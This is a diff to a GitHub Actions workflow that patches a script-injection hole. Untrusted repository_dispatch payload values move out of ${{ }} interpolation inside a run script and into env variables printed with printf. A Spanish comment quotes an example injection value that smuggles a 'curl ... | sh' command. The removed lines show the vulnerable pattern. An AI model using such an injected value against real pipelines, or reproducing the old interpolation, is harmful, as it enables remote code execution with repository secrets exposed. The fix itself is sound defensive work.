@@ -50,17 +50,30 @@ jobs:
       # Mide la puntualidad del disparador: el Worker manda la hora que el cron
       # pretendia y la que se ejecuto de verdad. Sin esto no hay forma de saber
       # si cambiar de disparador sirvio de algo.
+      # Los valores del client_payload van por `env`, NUNCA interpolados con
+      # ${{ }} dentro del `run`. Actions sustituye esas expresiones en el texto
+      # del script antes de ejecutarlo, asi que un desfase_s valiendo
+      #   "; curl algo | sh; #
+      # se ejecutaria como comando, con contents:write y todos los secrets a
+      # mano. Por `env` el runner los pasa como variables y el shell nunca los
+      # interpreta como codigo. printf %s en vez de echo para que un valor que
+      # empiece con - no se coma como opcion.
       - name: Puntualidad del disparo
         if: github.event_name == 'repository_dispatch'
+        env:
+          PROGRAMADO: ${{ github.event.client_payload.programado_iso }}
+          REAL: ${{ github.event.client_payload.real_iso }}
+          DESFASE: ${{ github.event.client_payload.desfase_s }}
         run: |
-          desfase="${{ github.event.client_payload.desfase_s }}"
-          echo "| disparo | valor |" >> "$GITHUB_STEP_SUMMARY"
-          echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
-          echo "| programado | ${{ github.event.client_payload.programado_iso }} |" >> "$GITHUB_STEP_SUMMARY"
-          echo "| real | ${{ github.event.client_payload.real_iso }} |" >> "$GITHUB_STEP_SUMMARY"
-          echo "| desfase | ${desfase}s |" >> "$GITHUB_STEP_SUMMARY"
-          echo "" >> "$GITHUB_STEP_SUMMARY"
-          echo "Desfase del disparador: ${desfase}s"
+          {
+            printf '| disparo | valor |\n'
+            printf '|---|---|\n'
+            printf '| programado | %s |\n' "$PROGRAMADO"
+            printf '| real | %s |\n' "$REAL"
+            printf '| desfase | %ss |\n' "$DESFASE"
+            printf '\n'
+          } >> "$GITHUB_STEP_SUMMARY"
+          printf 'Desfase del disparador: %ss\n' "$DESFASE"
 
       - uses: actions/checkout@v4
 
